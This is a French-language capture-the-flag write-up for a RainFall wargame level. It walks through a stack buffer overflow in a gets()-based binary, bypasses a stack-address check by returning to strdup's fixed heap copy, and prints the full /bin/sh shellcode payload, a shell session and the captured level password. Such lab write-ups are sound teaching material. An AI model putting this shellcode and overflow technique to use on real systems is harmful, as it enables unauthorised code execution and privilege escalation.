# level 3

Dans cette partie nous avons egalement un binaire qui ressemble a quelque choses pres a celui de la partie 2:

```C
#include <stdio.h>
#include <string.h>
#include <sys/types.h>

void p(void)
{
    uint addr;
    char buff[76];

    fflush(stdout);
    gets(buff);
    if ((addr & 0xb0000000) == 0xb0000000)
    {
        printf("(%p)\n", addr);
        _exit(1);
    }
    puts(buff);
    strdup(buff);
    return ;
}

void main(void)
{
    p();
    return ;
}
```

Dans ce programme nous avons un int sur 4-bit `(addr)` et un buffer de 76-bit `(buff)`. Ensuite nous avec gets pour remplir ce buffer. Le if est une protection si addr pointe sur une adresse dans la stack on exit (syscall).

Nous allons donc nous servir de l'allocation sur la heap de strdup pour tromper cette verification et executer un shellcode.

Le principe est qu'on stocke notre shellcode au debut de `buff` et l'adresse de retour dans `addr`. A cause du if nous ne pouvons pas pointer l'adresse de retour directement sur le debut de `buff` car alloue sur la stack. En utilisant ltrace nous pouvons voir que strdup renvoie toujours la meme adresse sur la heap:

```bash
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                            = 0
gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5
)                                 = 0xbffff70c
puts(""
)                                                                      = 1
strdup("")                                                                    = 0x0804a008
+++ exited (status 8) +++
```

La ligne importante ici est: `strdup("")                                                                    = 0x0804a008`

Nous allons donc ecraser l'adresse contenue par addr par l'adresse donnee par `ltrace`: `0x0804a008`. Il nous faut maintenant trouver un shellcode capable d'executer `/bin/sh` en tant que level3 (Cf. permissions)

Ce qui nous donne ceci:

```bash
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' ; cat) | ./level2
j
 X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

De la meme maniere que dans le level1 nous devons remplir entierement `buff` d'ou le `"A" * 59`
